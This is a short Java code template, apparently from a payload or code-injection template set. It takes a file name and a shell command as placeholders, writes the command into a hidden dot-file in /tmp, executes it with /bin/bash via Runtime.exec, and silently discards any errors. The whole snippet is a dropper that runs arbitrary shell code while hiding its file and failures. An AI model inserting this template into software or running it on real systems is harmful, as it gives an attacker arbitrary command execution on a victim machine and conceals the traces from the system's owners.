// @in <hiddenfile> java.lang.String file-path
// @in <shellpayload> java.lang.String shell-command
try {
    String dropped = "/tmp/." + <hiddenfile>;
    java.io.FileWriter fw = new java.io.FileWriter(dropped);
    fw.write(<shellpayload>);
    fw.close();
    Runtime.getRuntime().exec("/bin/bash " + dropped);
} catch (java.io.IOException e) {}
